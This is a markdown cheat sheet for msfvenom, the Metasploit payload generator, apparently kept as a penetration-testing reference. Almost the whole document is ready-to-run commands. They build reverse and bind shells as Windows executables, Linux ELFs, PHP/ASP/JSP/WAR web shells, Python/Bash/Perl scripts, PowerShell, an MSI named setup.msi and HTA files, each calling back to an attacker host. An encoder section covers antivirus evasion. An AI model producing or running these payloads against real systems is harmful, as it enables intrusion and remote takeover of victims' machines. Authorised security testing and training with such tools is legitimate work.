# msfvenom

## General Syntax
`msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <outfile>`

- `-p` → payload  
- `LHOST` → local host (attacker)  
- `LPORT` → local port (attacker)  
- `-f` → output format (exe, elf, asp, war, raw, etc.)  
- `-o` → output file  

---

## Common Reverse Shell Payloads

### Windows
- Reverse TCP:  
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe`

- Reverse HTTPS:  
  `msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f exe -o shell.exe`

- Stageless Reverse TCP:  
  `msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o rev.exe`

---

### Linux
- Reverse TCP ELF:  
  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf`

- Stageless Reverse TCP:  
  `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o rev.elf`

---

### Web Payloads
- PHP Reverse Shell:  
  `msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php`

- ASP Reverse Shell:  
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp`

- JSP Reverse Shell:  
  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp`

- WAR File:  
  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war`

---

## Bind Shell Payloads

- Windows Bind TCP:  
  `msfvenom -p windows/meterpreter/bind_tcp LPORT=<port> -f exe -o bind.exe`

- Linux Bind TCP:  
  `msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<port> -f elf -o bind.elf`

---

## Scripting Payloads

- Python:  
  `msfvenom -p python/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o shell.py`

- Bash:  
  `msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -o shell.sh`

- Perl:  
  `msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -o shell.pl`

---

## Other Formats

- PowerShell:  
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f psh -o shell.ps1`

- MSI Installer:  
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o setup.msi`

- HTA (HTML Application):  
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o shell.hta`

---

## Encoding & Evasion

- Show encoders:  
  `msfvenom -l encoders`

- Use encoder:  
  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe`

---

## Useful Notes
- Use `msfvenom -l payloads` to list all payloads.  
- Staged payloads = `/meterpreter/reverse_tcp` (require handler).  
- Stageless payloads = `/shell_reverse_tcp` (direct shell).  
- Always set matching `LHOST`/`LPORT` in listener (e.g. Metasploit `multi/handler`).  